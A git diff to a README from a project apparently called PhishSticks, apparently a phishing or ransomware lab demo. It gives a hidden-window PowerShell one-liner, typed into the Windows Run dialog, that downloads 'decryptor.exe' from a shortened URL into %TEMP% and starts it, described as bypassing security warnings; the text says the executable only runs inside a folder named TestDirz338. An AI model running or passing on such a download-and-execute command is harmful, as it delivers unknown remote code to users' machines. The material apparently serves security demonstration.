@@ -31,11 +31,11 @@ Make a folder called TestDirz338 in the path C:/Users/{USER}/
 ![2023-12-05_18-59](https://github.com/therealhalonen/PhishSticks/assets/112076418/6682c7df-debb-40ce-bba0-aea449f228f4)
 
 
-Bypass security warnings and download & execute the file instantly in TestDirz338 folder by typing the following code into Run (Win+R) on **Windows**:
+Bypass security warnings and download the file in users %TEMP folder % & execute the application instantly in TestDirz338 folder by typing the following code into Run (Win+R) on **Windows**:
 ```
-powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/28sb6pvc', \"$env:UserProfile\TestDirz338\decryptor.exe\");Start-Process \"$env:UserProfile\TestDirz338\decryptor.exe\" -WorkingDir \"$env:UserProfile\TestDirz338\""
+powershell -w hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/28sb6pvc', \"$env:TEMP\decryptor.exe\");Start-Process \"$env:TEMP\decryptor.exe\" -WorkingDir \"$env:UserProfile\TestDirz338\""
 ```
-If you don't have a folder called TestDirz338 and you execute the code above, nothing happens. Also trying to run the executable anywhere else raises an error:
+If you don't have a folder called TestDirz338 in path C:/Users/{USER}/ and you execute the code above, nothing happens. Also trying to run the executable anywhere else that inside TestDirz338 raises an error:
 
 ![2023-12-05_18-56](https://github.com/therealhalonen/PhishSticks/assets/112076418/85b533aa-ec2b-40af-9d5d-66121cf92b4f)
 
